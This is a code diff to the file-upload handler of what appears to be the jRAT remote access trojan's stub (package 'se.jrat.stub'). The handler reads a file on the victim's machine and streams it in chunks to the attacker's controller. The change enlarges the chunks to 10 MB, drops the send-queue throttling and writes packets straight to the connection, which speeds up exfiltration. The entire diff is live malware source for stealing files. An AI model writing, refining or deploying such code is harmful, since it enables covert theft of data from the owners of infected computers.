@@ -4,6 +4,7 @@ import java.io.File;
 import java.io.FileInputStream;
 
 import se.jrat.stub.Connection;
+import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet29ClientUploadPart;
 import se.jrat.stub.packets.outgoing.Packet30BeginClientUpload;
 import se.jrat.stub.packets.outgoing.Packet31CompleteClientUpload;
@@ -22,12 +23,13 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 						Connection.instance.addToSendQueue(new Packet30BeginClientUpload(file));
 
 						FileInputStream fileInput = new FileInputStream(file);
-						byte[] chunk = new byte[1024 * 8];
+						byte[] chunk = new byte[1024 * 1024 * 10];
 
-						for (long pos = 0; pos < file.length(); pos += 1024 * 8) {
-							int read = fileInput.read(chunk);
-							Connection.instance.addToSendQueue(new Packet29ClientUploadPart(file, chunk, read));
-							Thread.sleep(100L);
+						int read;
+						while ((read = fileInput.read(chunk)) != -1) {
+							AbstractOutgoingPacket packet = new Packet29ClientUploadPart(file, chunk, read);
+							packet.send(Connection.instance.getDataOutputStream(), Connection.instance.getStringWriter());
+
 						}
 						fileInput.close();
 						
@@ -36,7 +38,7 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 						ex.printStackTrace();
 					}
 				}
-			}).start();
+			}).run();
 		}
 	}
 
